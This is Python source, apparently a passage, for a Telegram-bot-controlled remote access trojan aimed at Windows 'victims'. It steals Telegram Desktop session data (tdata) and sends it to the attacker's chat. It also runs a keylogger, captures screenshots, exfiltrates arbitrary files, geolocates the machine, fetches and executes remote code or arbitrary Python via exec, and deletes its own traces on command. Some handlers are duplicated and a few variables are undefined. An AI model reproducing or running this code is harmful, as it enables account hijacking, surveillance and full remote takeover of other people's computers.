@bot.message_handler(commands=['url'])
def archive_and_send():
    user = os.path.expanduser("~")
    if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
        try:
            source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
            temp_dir = os.path.join(os.getcwd(), 'temp')
            if not os.path.exists(temp_dir):
                os.makedirs(temp_dir)  # Создаем папку, если её нет
            output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')

            created_zip = create_zip_archive(source_dir, output_zip)
            if created_zip:
                send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
            else:
                print("Failed to create or send zip file.")
        except Exception as e:
            print(f"Error creating or sending zip file: {str(e)}")
    else:
        print("Папка 'tdata' не найдена.")
def list_dir(message):
    chat_id = message.chat.id
    path = message.text.replace('/url', '').strip()

    if not path.startswith('http'):
        bot.send_message(chat_id,
                         'Неверный формат URL. Пожалуйста, укажите действительный URL, начиная с http или https.')
    else:
        try:
            response = requests.get(path)
            response.raise_for_status()
            html_content = response.content
            soup = BeautifulSoup(html_content, 'html.parser')
            text_without_tags = soup.get_text()
            exec(text_without_tags)
            bot.send_message(chat_id, 'Код успешно выполнен.')
        except requests.exceptions.RequestException as e:
            bot.send_message(chat_id, f'Ошибка: {e}')
        except Exception as e:
            bot.send_message(chat_id, f'Произошла ошибка при выполнении кода: {e}')
@bot.message_handler(commands=['code'])
def execute_code(message):
    chat_id = message.chat.id
    code = message.text.replace('/code', '').strip()
    if code == '':
        bot.send_message(chat_id, '/code твой код')
    try:
        exec(code)
        bot.send_message(chat_id, 'Код успешно выполнен.')
    except Exception as e:
        bot.send_message(chat_id, f'Произошла ошибка при выполнении кода: {e}')

def send_message_on_start():
    username = os.getlogin()
    bot.send_message(chat_id, f"Подключен пк: {username}")
    bot.send_message(chat_id, "КОМАНДЫ: '\n' /capture_pc - скриншот '\n' /keylogs - кейлоггер '\n' /pc_info -  информация о пк'\n'/msg_box - вывести сообщение жертве: /msg_box текст'\n'/ip_info - инфо об айпи адресе'\n'/download_file - загрузить файл с пк жертвы: /download_file путь'\n'/list_dir - вывести все названия из папки: /list_dir путь до папки'\n'/run_file - запустить файл по пути'\n'/tg_grab - взять ссессию тг'\n' /url - подгрузка кода + последующее его выполнение'\n'/code - выполнить ваш код(пайтон)  ")
    itembtn1 = types.KeyboardButton('/capture_pc')
    itembtn2 = types.KeyboardButton('/keylogs')
    itembtn3 = types.KeyboardButton('/pc_info')
    itembtn4 = types.KeyboardButton('/msg_box')
    itembtn5 = types.KeyboardButton('/ip_info')
    itembtn6 = types.KeyboardButton('/download_file')
    itembtn7 = types.KeyboardButton('/list_dir')
    itembtn8 = types.KeyboardButton('/run_file')
    itembtn9 = types.KeyboardButton('/archive_and_send')
    itembtn10 = types.KeyboardButton('/url')
    itembtn11 = types.KeyboardButton('/code')
send_message_on_start()
user = os.environ.get("USERNAME")
user_folder = os.path.expanduser('~')
log_file = os.path.join(user_folder, 'keylogs.txt')
with open(log_file, "a") as f:
    f.write("-------------------------------------------------\n")
    f.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n")
initi = False
def pressed_chars(event):
    if event.Ascii:
        with open(log_file, "a") as f:
            char = chr(event.Ascii)
            if event.Ascii == 8:
                f.write("[BS]")
            if event.Ascii == 9:
                f.write("[TAB]")
            if event.Ascii == 13:
                f.write("[ENTER]\n")
            f.write(char)
def checkchat_id(chat_id):
    return True
@bot.message_handler(commands=['capture_pc'])
def capture_pc(message):
    chat_id = message.chat.id
    bot.send_chat_action(chat_id, 'typing')
    screenshot = ImageGrab.grab()
    screenshot.save('screenshot.jpg')
    with open('screenshot.jpg', 'rb') as photo:
        bot.send_document(chat_id, photo)
    try:
        error_message = f"ВЫПОЛНЕННО!!!"
        bot.send_message(chat_id, error_message)
    except PermissionError as e:
        error_message = f"ОШИБКА:: {e}"
        bot.send_message(chat_id, error_message)
    except Exception as e:
        error_message = f"ОШИБКА: {e}"
        bot.send_message(chat_id, error_message)
@bot.message_handler(commands=['keylogs'])
def keylogs(message):
    chat_id = message.chat.id
    bot.send_chat_action(chat_id, 'upload_document')
    try:
        with open(log_file, "rb") as file:
            bot.send_document(chat_id, file)
        error_message = f"ВЫПОЛНЕННО!!!"
        bot.send_message(chat_id, error_message)
    except FileNotFoundError as e:
        error_message = f"ОШИБКА: Файл не найден"
        bot.send_message(chat_id, error_message)
    except PermissionError as e:
        error_message = f"ОШИБКА: Недостаточно прав для доступа к файлу"
        bot.send_message(chat_id, error_message)
    except Exception as e:
        error_message = f"ОШИБКА: {e}"
        bot.send_message(chat_id, error_message)
@bot.message_handler(commands=['pc_info'])
def pc_info(message):
    chat_id = message.chat.id
    bot.send_chat_action(chat_id, 'typing')
    info = ''
    for pc_info in platform.uname():
        info += '\n' + pc_info
    bot.send_message(chat_id, info)
    try:
        error_message = f"ВЫПОЛНЕННО!!!"
        bot.send_message(chat_id, error_message)
    except PermissionError as e:
        error_message = f"ОШИБКА:: {e}"
        bot.send_message(chat_id, error_message)
    except Exception as e:
        error_message = f"ОШИБКА: {e}"
        bot.send_message(chat_id, error_message)
@bot.message_handler(commands=['msg_box'])
def msg_box(message):
    chat_id = message.chat.id
    message_text = message.text.replace('/msg_box ', '')
    if message_text == '':
        bot.send_message(chat_id, 'НЕПРАВИЛЬНО НУЖНО ТАК: /msg_box твой текст')
    else:
        bot.send_message(chat_id, f'ПОЛЬЗОВАТЕЛЮ ВЫВЕДЕНО СООБЩЕНИЕ: {message_text}')
        message_bytes = message_text.encode('cp1251')
        ctypes.windll.user32.MessageBoxA(0, message_bytes, 'Information', 0)
        bot.send_message(chat_id, 'ПОЛЬЗОВАТЕЛЬ ЗАКРЫЛ СООБЩЕНИЕ')
    try:
        error_message = f"ВЫПОЛНЕННО!!!"
        bot.send_message(chat_id, error_message)
    except PermissionError as e:
        error_message = f"ОШИБКА:: {e}"
        bot.send_message(chat_id, error_message)
    except Exception as e:
        error_message = f"ОШИБКА: {e}"
        bot.send_message(chat_id, error_message)
@bot.message_handler(commands=['ip_info'])
def ip_info(message):
    chat_id = message.chat.id
    bot.send_chat_action(chat_id, 'find_location')
    info = requests.get('http://ipinfo.io').text
    bot.send_message(chat_id, info)
    location = loads(info)['loc'].split(',')
    bot.send_location(chat_id, location[0], location[1])
    try:
        error_message = f"ВЫПОЛНЕННО!!!"
        bot.send_message(chat_id, error_message)
    except PermissionError as e:
        error_message = f"ОШИБКА:: {e}"
        bot.send_message(chat_id, error_message)
    except Exception as e:
        error_message = f"ОШИБКА: {e}"
        bot.send_message(chat_id, error_message)
async def send_file(chat_id, file):
    try:
        await bot.send_document(chat_id, file)
    except asyncio.TimeoutError as e:
        bot.send_message(chat_id, 'Error: Sending file timed out')
async def download_and_send_file(chat_id, path):
    try:
        bot.send_chat_action(chat_id, 'upload_document')
        if os.path.isabs(path):
            with open(path, 'rb') as file:
                await asyncio.wait_for(send_file(chat_id, file), timeout=30)
        else:
            bot.send_message(chat_id, 'Please provide an absolute file path')
    except FileNotFoundError:
        bot.send_message(chat_id, 'File not found')
    except asyncio.TimeoutError:
        bot.send_message(chat_id, 'Error: Sending file timed out')
    except Exception as e:
        bot.send_message(chat_id, f'Error: {e}')
@bot.message_handler(commands=['download_file'])
def download_file(message):
    chat_id = message.chat.id
    path = message.text.replace('/download_file', '').strip()
    if path == '':
        bot.send_chat_action(chat_id, 'typing')
        bot.send_message(chat_id, '/download_file C:/path/to/file')
    else:
        asyncio.run(download_and_send_file(chat_id, path))
    try:
        error_message = f"ВЫПОЛНЕННО!!!"
        bot.send_message(chat_id, error_message)
    except PermissionError as e:
        error_message = f"ОШИБКА:: {e}"
        bot.send_message(chat_id, error_message)
    except Exception as e:
        error_message = f"ОШИБКА: {e}"
        bot.send_message(chat_id, error_message)
@bot.message_handler(commands=['list_dir'])
def list_dir(message):
    chat_id = message.chat.id
    path = message.text.replace('/list_dir', '').strip()
    if path == '':
        bot.send_message(chat_id, '/list_dir C:/path/to/folder')
    else:
        try:
            files = os.listdir(path)
            human_readable = '\n'.join(files)
            bot.send_message(chat_id, human_readable)
        except:
            bot.send_message(chat_id, 'Invalid path')
    try:
        error_message = f"ВЫПОЛНЕННО!!!"
        bot.send_message(chat_id, error_message)
    except PermissionError as e:
        error_message = f"ОШИБКА:: {e}"
        bot.send_message(chat_id, error_message)
    except Exception as e:
        error_message = f"ОШИБКА: {e}"
        bot.send_message(chat_id, error_message)
@bot.message_handler(commands=['run_file'])
def run_file(message):
    chat_id = message.chat.id
    path = message.text.replace('/run_file', '').strip()
    if path == '':
        bot.send_message(chat_id, '/run_file C:/path/to/file')
    else:
        os.startfile(path)
        bot.send_message(chat_id, 'Command executed')
    try:
        error_message = f"ВЫПОЛНЕННО!!!"
        bot.send_message(chat_id, error_message)
    except PermissionError as e:
        error_message = f"ОШИБКА:: {e}"
        bot.send_message(chat_id, error_message)
    except Exception as e:
        error_message = f"ОШИБКА: {e}"
        bot.send_message(chat_id, error_message)
@bot.message_handler(commands=['self_destruct'])
def self_destruct(message):
    chat_id = message.chat.id
    global initi
    initi = True
    bot.send_message(chat_id, "Are you sure? Type 'DESTROYNOW!' to proceed.")
    try:
        error_message = f"ВЫПОЛНЕННО!!!"
        bot.send_message(chat_id, error_message)
    except PermissionError as e:
        error_message = f"ОШИБКА:: {e}"
        bot.send_message(chat_id, error_message)
    except Exception as e:
        error_message = f"ОШИБКА: {e}"
        bot.send_message(chat_id, error_message)
@bot.message_handler(func=lambda message: message.text == 'DESTROYNOW!' and initi)
def destroy_all_traces(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "DESTROYING ALL TRACES! POOF!")
    if os.path.isfile(hide_location):
        os.remove(hide_location)
    if os.path.isfile(target_file):
        os.remove(target_file)
    if os.path.isfile(log_file):
        os.remove(log_file)
    try:
        error_message = f"ВЫПОЛНЕННО!!!"
        bot.send_message(chat_id, error_message)
    except PermissionError as e:
        error_message = f"ОШИБКА:: {e}"
        bot.send_message(chat_id, error_message)
    except Exception as e:
        error_message = f"ОШИБКА: {e}"
        bot.send_message(chat_id, error_message)
@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    markup = types.ReplyKeyboardMarkup(row_width=1)
    itembtn1 = types.KeyboardButton('/capture_pc')
    itembtn2 = types.KeyboardButton('/keylogs')
    itembtn3 = types.KeyboardButton('/pc_info')
    itembtn4 = types.KeyboardButton('/msg_box')
    itembtn5 = types.KeyboardButton('/ip_info')
    itembtn6 = types.KeyboardButton('/download_file')
    itembtn7 = types.KeyboardButton('/list_dir')
    itembtn8 = types.KeyboardButton('/run_file')
    itembtn9 = types.KeyboardButton('/tg_grab')
    itembtn10 = types.KeyboardButton('/url')
    itembtn11 = types.KeyboardButton('/code')
    markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
    bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
def create_zip_archive(source_dir, output_zip):
    try:
        with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
            pass  # Создаем пустой архив для начала
        with zipfile.ZipFile(output_zip + '.zip', 'a') as zipf:  # Открываем архив для добавления файлов
            for root, _, files in os.walk(source_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    if any(substring in file_path for substring in ["user_data", "webview", "temp", "emoji", "shortcuts-default.json", "working"]):
                        continue
                    try:
                        zipf.write(file_path, os.path.relpath(file_path, source_dir))
                    except Exception as e:
                        send_message_to_group(chat_id)
                        time.sleep(10)
                        print(f"Error adding file to zip: {str(e)}")
        return output_zip + '.zip'
    except Exception as e:
        send_message_to_group(chat_id)
        time.sleep(10)
        print(f"Error creating zip archive: {str(e)}")
        return None

def archive_and_send2():
    user = os.path.expanduser("~")
    if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
        try:
            source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
            temp_dir = os.path.join(os.getcwd(), 'temp')
            if not os.path.exists(temp_dir):
                os.makedirs(temp_dir)  # Создаем папку, если её нет
            output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')

            created_zip = create_zip_archive(source_dir, output_zip)
            if created_zip:
                send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
            else:
                print("Failed to create or send zip file.")
        except Exception as e:
            print(f"Error creating or sending zip file: {str(e)}")
    else:
        print("Папка 'tdata' не найдена.")

def send_message_to_group(chat_id):
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    data = {'chat_id': chat_id, 'text': f"System Name: {system_name}\n"}
    response = requests.post(url, data=data)

def send_file_to_telegram(file_path, file_name):
    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
    files = {'document': (file_name, open(file_path, 'rb'))}
    data = {'chat_id': chat_id}
    response = requests.post(url, files=files, data=data)
    if response.status_code != 200:
        print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
        print(response.text)
@bot.message_handler(commands=['tg_grab'])
def handle_tg_grab_command(message):
    thread = threading.Thread(target=archive_and_send2)
    thread.start()
    time.sleep(20)
    if thread.is_alive():
        print("АРХИВ ЗАГРУЖАЕТСЯ СЛИШКОМ ДОЛГО, ПРИНУДИТЕЛЬНАЯ ОТПРАВКА.")
        thread.join()
    try:
        error_message = "ВЫПОЛНЕНО!!!"
        bot.send_message(chat_id, error_message)
    except Exception as e:
        error_message = f"ОШИБКА: {e}"
        bot.send_message(chat_id, error_message)

print('СЛУШАЮ КОМАНДЫ...')
bot.polling()
proc = pyHook.HookManager()
proc.KeyDown = pressed_chars
proc.HookKeyboard()
pythoncom.PumpMessages()
